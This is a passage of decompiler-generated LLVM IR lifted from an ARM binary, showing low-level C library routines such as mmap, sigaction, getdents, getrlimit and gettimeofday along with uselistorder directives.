  uselistorder i32 %v1_16a38, { 1, 0 }
  uselistorder i32 %v1_16a04, { 1, 0 }
  uselistorder i32 %v1_16a00, { 1, 2, 3, 0 }
  uselistorder i32 %v1_169f4, { 1, 0 }
  uselistorder i32 %v2_169d0, { 1, 0, 2 }
  uselistorder i32 %v4_169b4, { 1, 0, 2 }
  uselistorder i32 %v4_169a4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_168ec, { 1, 2, 0 }
  uselistorder i32 %v2_168b8, { 1, 2, 0 }
  uselistorder i32 %v1_168b4, { 1, 2, 0 }
  uselistorder i1 %v2_168a0, { 1, 0, 2 }
  uselistorder i32 %v5_168a4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16870, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16858, { 1, 0, 2 }
  uselistorder i32 %v2_1684c, { 1, 0, 2 }
  uselistorder i32 %v3_1681c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 3, 1, 2, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 0, 1, 3 }
  uselistorder i32 120, { 0, 2, 1, 4, 3 }
  uselistorder i32 2012, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_16b98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16b50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b38, { 1, 0 }
  uselistorder label %dec_label_pc_16aa0, { 1, 0 }
  uselistorder label %dec_label_pc_16a78, { 1, 0 }
  uselistorder label %dec_label_pc_169f4, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16970, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16948, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_168b8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_168a0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16bec = load i32, i32* @r4, align 4
  store i32 %v3_16bec, i32* %stack_var_-16, align 4
  %v3_16bf8 = urem i32 %arg3, 4096
  %v2_16bfc = icmp eq i32 %v3_16bf8, 0
  br i1 %v2_16bfc, label %dec_label_pc_16c20, label %dec_label_pc_16c04

dec_label_pc_16c04:                               ; preds = %entry
  %v0_16c08 = call i32 @__aeabi_read_tp()
  store i32 %v0_16c08, i32* %r0.global-to-local, align 4
  %v3_16c0c = load i16, i16* @global_var_2447c.761, align 2
  %v4_16c0c = sext i16 %v3_16c0c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16c18 = add i32 %v4_16c0c, %v0_16c08
  %v4_16c18 = inttoptr i32 %v3_16c18 to i32*
  store i32 22, i32* %v4_16c18, align 4
  %v0_16c54.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c54

dec_label_pc_16c20:                               ; preds = %entry
  %v0_16c30 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16c30, -4095
  br i1 %tmp, label %dec_label_pc_16c50, label %dec_label_pc_16c38

dec_label_pc_16c38:                               ; preds = %dec_label_pc_16c20
  %v1_16c3c = sub i32 0, %v0_16c30
  %v3_16c40 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16c40 = sext i16 %v3_16c40 to i32
  %v0_16c44 = call i32 @__aeabi_read_tp()
  %v3_16c48 = add i32 %v4_16c40, %v0_16c44
  %v4_16c48 = inttoptr i32 %v3_16c48 to i32*
  store i32 %v1_16c3c, i32* %v4_16c48, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16c50

dec_label_pc_16c50:                               ; preds = %dec_label_pc_16c20, %dec_label_pc_16c38
  %v0_16c50 = phi i32 [ %v0_16c30, %dec_label_pc_16c20 ], [ -1, %dec_label_pc_16c38 ]
  store i32 %v0_16c50, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c54

dec_label_pc_16c54:                               ; preds = %dec_label_pc_16c04, %dec_label_pc_16c50
  %v0_16c54 = phi i32 [ %v0_16c54.pre, %dec_label_pc_16c04 ], [ %v0_16c50, %dec_label_pc_16c50 ]
  store i32 %v0_16c54, i32* %r0.global-to-local, align 4
  %v2_16c58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16c58, i32* @r4, align 4
  ret i32 %v0_16c54

; uselistorder directives
  uselistorder i32 %v0_16c54, { 1, 0 }
  uselistorder i32 %v0_16c30, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_16c54, { 1, 0 }
  uselistorder label %dec_label_pc_16c50, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_16c68 = load i32, i32* @lr, align 4
  store i32 %v0_16c68, i32* %stack_var_-4, align 4
  %v0_16c70 = load i32, i32* @r0, align 4
  %v3_16c74 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16c74 = sext i16 %v3_16c74 to i32
  store i32 %v4_16c74, i32* @r2, align 4
  %v0_16c78 = call i32 @__aeabi_read_tp()
  %v1_16c7c = sub i32 0, %v0_16c70
  store i32 %v1_16c7c, i32* @r3, align 4
  %v2_16c80 = load i32, i32* @r2, align 4
  %v3_16c80 = add i32 %v2_16c80, %v0_16c78
  %v4_16c80 = inttoptr i32 %v3_16c80 to i32*
  store i32 %v1_16c7c, i32* %v4_16c80, align 4
  %v2_16c88 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16c88, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16c94 = load i32, i32* @r4, align 4
  %v6_16c94 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_16c9c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_16c9c, label %dec_label_pc_16cf0, label %dec_label_pc_16cb4

dec_label_pc_16cb4:                               ; preds = %entry
  %v1_16cb4 = add i32 %arg2, 4
  %v2_16cb4 = inttoptr i32 %v1_16cb4 to i32*
  %v3_16cb4 = load i32, i32* %v2_16cb4, align 4
  store i32 %v3_16cb4, i32* @r3, align 4
  %v1_16cb8 = and i32 %v3_16cb4, 67108864
  %v2_16cb8 = icmp eq i32 %v1_16cb8, 0
  br i1 %v2_16cb8, label %dec_label_pc_16cc0, label %dec_label_pc_16cf0

dec_label_pc_16cc0:                               ; preds = %dec_label_pc_16cb4
  store i32 20, i32* @r2, align 4
  %v2_16cc4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16cc4, i32* @r0, align 4
  %v0_16cc8 = call i32 @memcpy()
  store i32 %v2_16cc4, i32* @ip, align 4
  %v0_16cf0.pre = load i32, i32* @r5, align 4
  %v0_16cf8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16cf0

dec_label_pc_16cf0:                               ; preds = %dec_label_pc_16cb4, %entry, %dec_label_pc_16cc0
  %v0_16cf8 = phi i32 [ %arg3, %dec_label_pc_16cb4 ], [ %arg3, %entry ], [ %v0_16cf8.pre, %dec_label_pc_16cc0 ]
  %v0_16cf4 = phi i32 [ %arg2, %dec_label_pc_16cb4 ], [ 0, %entry ], [ %v2_16cc4, %dec_label_pc_16cc0 ]
  %v0_16cf0 = phi i32 [ %arg1, %dec_label_pc_16cb4 ], [ %arg1, %entry ], [ %v0_16cf0.pre, %dec_label_pc_16cc0 ]
  %v4_16d00 = call i32 @__syscall_rt_sigaction(i32 %v0_16cf0, i32 %v0_16cf4, i32 %v0_16cf8, i32 8)
  store i32 %v3_16c94, i32* @r4, align 4
  store i32 %v6_16c94, i32* @r5, align 4
  ret i32 %v4_16d00

; uselistorder directives
  uselistorder label %dec_label_pc_16cf0, { 2, 0, 1 }
}

define i32 @function_16d14(i32 %arg1) local_unnamed_addr {
dec_label_pc_16d14:
  %v0_16d14 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16d14, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16d14
  %v2_16d14 = load i32, i32* @r8, align 4
  %v4_16d14 = mul i32 %v2_16d14, 2
  %v5_16d14 = and i32 %v4_16d14, %arg1
  %v2_16d18 = load i32, i32* @ip, align 4
  %v4_16d18 = lshr i32 %v2_16d18, %v5_16d14
  %v5_16d18 = sub i32 32, %v5_16d14
  %v6_16d18 = shl i32 %v2_16d18, %v5_16d18
  %v7_16d18 = or i32 %v6_16d18, %v4_16d18
  %v9_16d18 = and i32 %v7_16d18, %v5_16d14
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16d14, %bb
  %v10_16d18 = phi i32 [ %arg1, %dec_label_pc_16d14 ], [ %v9_16d18, %bb ]
  ret i32 %v10_16d18

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_16d20 = call i32 @__sigsetjmp()
  ret i32 %v0_16d20
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16d50 = load i32, i32* @r7, align 4
  store i32 %v3_16d50, i32* %stack_var_-8, align 4
  %v0_16d5c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d5c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16d5c, -4095
  br i1 %tmp, label %dec_label_pc_16d84, label %dec_label_pc_16d6c

dec_label_pc_16d6c:                               ; preds = %entry
  %v0_16d70 = call i32 @__aeabi_read_tp()
  %v3_16d74 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16d74 = sext i16 %v3_16d74 to i32
  %v0_16d78 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d78 = sub i32 0, %v0_16d78
  store i32 %v1_16d78, i32* %r2.global-to-local, align 4
  %v3_16d7c = add i32 %v4_16d74, %v0_16d70
  %v4_16d7c = inttoptr i32 %v3_16d7c to i32*
  store i32 %v1_16d78, i32* %v4_16d7c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16d84.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16d84

dec_label_pc_16d84:                               ; preds = %entry, %dec_label_pc_16d6c
  %v1_16d88 = phi i32 [ %v0_16d5c, %entry ], [ -1, %dec_label_pc_16d6c ]
  %v2_16d84 = phi i32 [ %v3_16d50, %entry ], [ %v2_16d84.pre, %dec_label_pc_16d6c ]
  store i32 %v2_16d84, i32* @r7, align 4
  ret i32 %v1_16d88

; uselistorder directives
  uselistorder i32 %v0_16d5c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16d84, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16d9c

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16dc8, %dec_label_pc_16ddc, %entry
  %v0_16d9c = phi i32 [ %arg1, %entry ], [ %v0_16d9c.pre.pre, %dec_label_pc_16ddc ], [ %v0_16dc8, %dec_label_pc_16dc8 ]
  store i32 %v0_16d9c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16d9c, -4095
  br i1 %tmp, label %dec_label_pc_16dc8, label %dec_label_pc_16db8

dec_label_pc_16db8:                               ; preds = %dec_label_pc_16d9c
  %v0_16db8 = call i32 @__aeabi_read_tp()
  %v0_16dbc = load i32, i32* %r2.global-to-local, align 4
  %v1_16dbc = sub i32 0, %v0_16dbc
  store i32 %v1_16dbc, i32* %r2.global-to-local, align 4
  %v3_16dc0 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16dc0 = sext i16 %v3_16dc0 to i32
  %v3_16dc4 = add i32 %v4_16dc0, %v0_16db8
  %v4_16dc4 = inttoptr i32 %v3_16dc4 to i32*
  store i32 %v1_16dbc, i32* %v4_16dc4, align 4
  %v0_16dc8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16dc8

dec_label_pc_16dc8:                               ; preds = %dec_label_pc_16d9c, %dec_label_pc_16db8
  %v0_16dc8 = phi i32 [ %v0_16d9c, %dec_label_pc_16d9c ], [ %v0_16dc8.pre, %dec_label_pc_16db8 ]
  store i32 %v0_16dc8, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_16dc8, -4095
  br i1 %tmp4, label %dec_label_pc_16d9c, label %dec_label_pc_16ddc

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16dc8
  %v0_16ddc = call i32 @__aeabi_read_tp()
  %v0_16de0 = load i32, i32* %r2.global-to-local, align 4
  %v1_16de0 = sub i32 0, %v0_16de0
  store i32 %v1_16de0, i32* %r2.global-to-local, align 4
  %v3_16de4 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16de4 = sext i16 %v3_16de4 to i32
  %v3_16de8 = add i32 %v4_16de4, %v0_16ddc
  %v4_16de8 = inttoptr i32 %v3_16de8 to i32*
  store i32 %v1_16de0, i32* %v4_16de8, align 4
  %v0_16d9c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16d9c

; uselistorder directives
  uselistorder i32 %v0_16dc8, { 0, 2, 1 }
  uselistorder i32 %v0_16d9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16dc8, { 1, 0 }
  uselistorder label %dec_label_pc_16d9c, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_16e00 = load i32, i32* @r1, align 4
  store i32 %v0_16e00, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_16e10 = load i32, i32* @r0, align 4
  store i32 %v0_16e10, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16e10, -4095
  br i1 %tmp, label %dec_label_pc_16e38, label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %entry
  %v0_16e20 = call i32 @__aeabi_read_tp()
  %v3_16e24 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16e24 = sext i16 %v3_16e24 to i32
  store i32 %v4_16e24, i32* @r3, align 4
  %v0_16e28 = load i32, i32* @r2, align 4
  %v1_16e28 = sub i32 0, %v0_16e28
  store i32 %v1_16e28, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_16e30 = add i32 %v4_16e24, %v0_16e20
  %v4_16e30 = inttoptr i32 %v3_16e30 to i32*
  store i32 %v1_16e28, i32* %v4_16e30, align 4
  br label %dec_label_pc_16e48

dec_label_pc_16e38:                               ; preds = %entry
  store i32 %v0_16e10, i32* %r7.global-to-local, align 4
  %v2_16e38 = icmp eq i32 %v0_16e10, 0
  br i1 %v2_16e38, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16e38
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16e38, %bb
  call void @__pseudo_cond_branch(i1 %v2_16e38, i32 ptrtoint (i32* @global_var_17288.990 to i32))
  br label %dec_label_pc_16e48

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e1c, %.thread
  %v0_16e48 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16e48

; uselistorder directives
  uselistorder i32 %v0_16e10, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16e48, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_16e5c = load i32, i32* @r5, align 4
  %v18_16e5c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16e94, label %dec_label_pc_16e78

dec_label_pc_16e78:                               ; preds = %entry
  %v1_16e7c = sub i32 0, %arg1
  %v3_16e80 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16e80 = sext i16 %v3_16e80 to i32
  store i32 %v4_16e80, i32* %r3.global-to-local, align 4
  %v0_16e84 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_16e8c = add i32 %v4_16e80, %v0_16e84
  %v4_16e8c = inttoptr i32 %v3_16e8c to i32*
  store i32 %v1_16e7c, i32* %v4_16e8c, align 4
  br label %dec_label_pc_16ee8

dec_label_pc_16e94:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16e94
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_16e9c = add i32 %arg2, %arg1
  store i32 %v3_16e9c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16e94, %bb
  %v1_16ed84 = phi i32 [ %v18_16e5c, %dec_label_pc_16e94 ], [ %v3_16e9c, %bb ]
  %v0_16ed42 = phi i32 [ 141, %dec_label_pc_16e94 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_16ee8, label %dec_label_pc_16ed4

dec_label_pc_16ea8:                               ; preds = %dec_label_pc_16ed4
  %v1_16edc = inttoptr i32 %v1_16ed4 to i8*
  %v1_16ea8 = add i32 %v0_16ea8, 8
  %v2_16ea8 = inttoptr i32 %v1_16ea8 to i16*
  %v3_16ea8 = load i16, i16* %v2_16ea8, align 2
  %v4_16ea8 = zext i16 %v3_16ea8 to i32
  %v2_16eac = add i32 %v4_16ea8, %v0_16ea8
  store i32 %v2_16eac, i32* @r3, align 4
  %v1_16eb0 = add i32 %v2_16eac, -1
  %v2_16eb0 = inttoptr i32 %v1_16eb0 to i8*
  %v3_16eb0 = load i8, i8* %v2_16eb0, align 1
  %v4_16eb0 = zext i8 %v3_16eb0 to i32
  store i32 %v4_16eb0, i32* @r4, align 4
  %v3_16eb4 = call i32 @strlen(i8* %v1_16edc)
  %v0_16eb8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16eb8, i32* @r1, align 4
  %v1_16ebc = add i32 %v3_16eb4, 1
  store i32 %v1_16ebc, i32* @r2, align 4
  %v0_16ec0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16ec0, i32* @r0, align 4
  %v3_16ec4 = call i32 @memmove(i32 %v0_16ec0, i32 %v0_16eb8, i32 %v1_16ebc)
  %v0_16ec8 = load i32, i32* %r7.global-to-local, align 4
  %v1_16ec8 = add i32 %v0_16ec8, 8
  %v2_16ec8 = inttoptr i32 %v1_16ec8 to i16*
  %v3_16ec8 = load i16, i16* %v2_16ec8, align 2
  %v4_16ec8 = zext i16 %v3_16ec8 to i32
  store i32 %v4_16ec8, i32* %r3.global-to-local, align 4
  %v0_16ecc = load i32, i32* @r4, align 4
  %v1_16ecc = trunc i32 %v0_16ecc to i8
  %v3_16ecc = add i32 %v0_16ec8, 10
  %v4_16ecc = inttoptr i32 %v3_16ecc to i8*
  store i8 %v1_16ecc, i8* %v4_16ecc, align 1
  %v0_16ed0 = load i32, i32* %r7.global-to-local, align 4
  %v1_16ed0 = load i32, i32* %r3.global-to-local, align 4
  %v2_16ed0 = add i32 %v1_16ed0, %v0_16ed0
  store i32 %v2_16ed0, i32* %r7.global-to-local, align 4
  %v1_16ed8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16ed4

dec_label_pc_16ed4:                               ; preds = %.thread, %dec_label_pc_16ea8
  %v1_16ed8 = phi i32 [ %v1_16ed8.pre, %dec_label_pc_16ea8 ], [ %v1_16ed84, %.thread ]
  %v0_16ea8 = phi i32 [ %v2_16ed0, %dec_label_pc_16ea8 ], [ %v0_16ed42, %.thread ]
  %v1_16ed4 = add i32 %v0_16ea8, 10
  store i32 %v1_16ed4, i32* %r6.global-to-local, align 4
  %v3_16ed8 = icmp ult i32 %v0_16ea8, %v1_16ed8
  %v1_16ee0 = add i32 %v0_16ea8, 11
  store i32 %v1_16ee0, i32* %r8.global-to-local, align 4
  br i1 %v3_16ed8, label %dec_label_pc_16ea8, label %dec_label_pc_16ee8

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16ed4, %.thread, %dec_label_pc_16e78
  %v0_16ee8 = load i32, i32* @r5, align 4
  store i32 %v6_16e5c, i32* @r5, align 4
  store i32 %v18_16e5c, i32* @sl, align 4
  ret i32 %v0_16ee8

; uselistorder directives
  uselistorder i32 %v1_16ed4, { 1, 0 }
  uselistorder i32 %v0_16ea8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_16e5c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_16ed4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_16f00 = ptrtoint i32* %stack_var_-16 to i32
  %v2_16f0c = call i32 @getrlimit(i32 7, i32 %v2_16f00)
  %v1_16f10 = icmp slt i32 %v2_16f0c, 0
  %v5_16f14 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_16f10, i32 256, i32 %v5_16f14
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_16f38 = load i32, i32* @r0, align 4
  ret i32 %v1_16f38
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_16f4c = load i32, i32* @r0, align 4
  ret i32 %v1_16f4c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16f60 = load i32, i32* @r0, align 4
  ret i32 %v1_16f60
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_16f70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 148) to i32*), align 4
  %v1_16f74 = inttoptr i32 %v4_16f70 to i32*
  %v2_16f74 = load i32, i32* %v1_16f74, align 4
  %v2_16f78 = icmp eq i32 %v2_16f74, 0
  br i1 %v2_16f78, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_16f80 = phi i32 [ %v2_16f74, %entry ], [ 4096, %bb ]
  ret i32 %v1_16f80

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16fb8, label %dec_label_pc_16fa0

dec_label_pc_16fa0:                               ; preds = %entry
  %v1_16fa4 = sub i32 0, %arg1
  %v3_16fa8 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16fa8 = sext i16 %v3_16fa8 to i32
  %v0_16fac = call i32 @__aeabi_read_tp()
  %v3_16fb0 = add i32 %v4_16fa8, %v0_16fac
  %v4_16fb0 = inttoptr i32 %v3_16fb0 to i32*
  store i32 %v1_16fa4, i32* %v4_16fb0, align 4
  br label %dec_label_pc_16fb8

dec_label_pc_16fb8:                               ; preds = %entry, %dec_label_pc_16fa0
  %v1_16fbc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16fa0 ]
  ret i32 %v1_16fbc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16fb8, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16fc4 = load i32, i32* @r7, align 4
  store i32 %v3_16fc4, i32* %stack_var_-8, align 4
  %v0_16fd0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16fd0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16fd0, -4095
  br i1 %tmp, label %dec_label_pc_16ff8, label %dec_label_pc_16fe0

dec_label_pc_16fe0:                               ; preds = %entry
  %v0_16fe4 = call i32 @__aeabi_read_tp()
  %v3_16fe8 = load i16, i16* @global_var_2447c.761, align 2
  %v4_16fe8 = sext i16 %v3_16fe8 to i32
  store i32 %v4_16fe8, i32* @r3, align 4
  %v0_16fec = load i32, i32* %r2.global-to-local, align 4
  %v1_16fec = sub i32 0, %v0_16fec
  store i32 %v1_16fec, i32* %r2.global-to-local, align 4
  %v3_16ff0 = add i32 %v4_16fe8, %v0_16fe4
  %v4_16ff0 = inttoptr i32 %v3_16ff0 to i32*
  store i32 %v1_16fec, i32* %v4_16ff0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16ff8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16ff8

dec_label_pc_16ff8:                               ; preds = %entry, %dec_label_pc_16fe0
  %v1_16ffc = phi i32 [ %v0_16fd0, %entry ], [ -1, %dec_label_pc_16fe0 ]
  %v2_16ff8 = phi i32 [ %v3_16fc4, %entry ], [ %v2_16ff8.pre, %dec_label_pc_16fe0 ]
  store i32 %v2_16ff8, i32* @r7, align 4
  ret i32 %v1_16ffc

; uselistorder directives
  uselistorder i32 %v0_16fd0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16ff8, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_17014 = load i32, i32* @r0, align 4
  ret i32 %v1_17014
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
